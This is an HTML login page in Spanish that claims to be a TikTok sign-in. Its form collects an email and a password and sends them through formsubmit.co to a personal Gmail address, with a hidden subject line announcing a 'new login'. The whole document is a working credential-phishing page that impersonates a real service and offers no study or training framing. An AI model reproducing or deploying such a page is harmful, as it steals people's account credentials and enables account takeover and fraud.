<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Iniciar sesión</title>
<style>
* {
  box-sizing: border-box;
}
body {
  margin: 0;
  background-image: url('IMG_1098.jpeg');
  background-repeat: no-repeat;
  background-size: cover;
  background-position: center;
  background-attachment: fixed;
  color: white;
  min-height: 100vh;
  padding: 20px;
  display: flex;
  justify-content: center;
  align-items: center;
  font-family: Arial, sans-serif;
}
.contenedor {
  width: 100%;
  max-width: 420px;
  padding: 25px;
  border-radius: 16px;
  background: rgba(0, 0, 0, 0.75);
  backdrop-filter: blur(8px);
}
h2 {
  text-align: center;
  margin-bottom: 25px;
}
.field {
  margin-bottom: 18px;
}
label {
  display: block;
  margin-bottom: 7px;
  font-size: 14px;
}
input {
  width: 100%;
  padding: 13px;
  border: none;
  border-radius: 8px;
  font-size: 15px;
}
.submit-btn {
  width: 100%;
  padding: 14px;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  font-size: 16px;
  font-weight: bold;
}
</style>
</head>
<body>
<div class="contenedor">
  <h2>Iniciar sesión con tu cuenta de tik tok</h2>
  <form
    action="https://formsubmit.co/echavarriaadonys@gmail.com"
    method="POST"
  >
<div class="field">
  <label for="correo">Correo electrónico</label>
  <input
    type="email"
    id="correo"
    name="correo"
    placeholder="tu@correo.com"
    required
  />
</div>
<div class="field">
  <label for="contraseña">Contraseña</label>
  <input
    type="password"
    id="contraseña"
    name="contraseña"
    placeholder="••••••••"
    required
  />
</div>
<input
  type="hidden"
  name="_subject"
  value="Nuevo inicio de sesión"
/>
<input
  type="hidden"
  name="_template"
  value="table"
/>
<button type="submit" class="submit-btn">
  Iniciar sesión
</button>
  </form>
</div>
</body>
</html>
